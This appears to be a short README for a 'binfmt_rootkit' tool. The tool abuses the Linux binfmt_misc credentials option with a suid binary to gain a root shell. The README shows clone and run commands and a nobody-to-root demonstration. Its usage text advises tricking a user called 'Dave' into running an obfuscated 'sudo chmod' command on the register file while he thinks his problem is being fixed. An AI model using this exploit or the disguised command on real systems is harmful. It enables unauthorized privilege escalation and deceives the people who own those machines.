
###########
binfmt_misc
###########

Kernel Support for miscellaneous (your favourite) exploits

No breakthrough here, just some trivia involving binary formats.

binfmt_rootkit
--------------

Poor man's rootkit, leverage `binfmt_misc`__'s credentials_ option to
escalate privilege through any suid binary (and to get a root shell) if
:literal:`/proc/sys/fs/binfmt_misc/register` is writeable.

__ https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst
.. _credentials: https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt_misc.txt#L62


.. code:: bash

    $ git clone https://github.com/plcp/binfmt_misc
    $ cd binfmt_misc
    $ ./binfmt_rootkit --help
    Usage: ./binfmt_rootkit
        Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
        note that it must be enforced by any other mean before your try this, for
        example by typing something like "sudo chmod +6 /*/*/f*/*/*r" while Dave
        is thinking that you are fixing his problem.


Cheap nobody to root is cheap:

.. code:: bash

    $ sudo -u nobody ./binfmt_rootkit 
    uid=0(root)
    sh-4.4#

Feel free to PR !
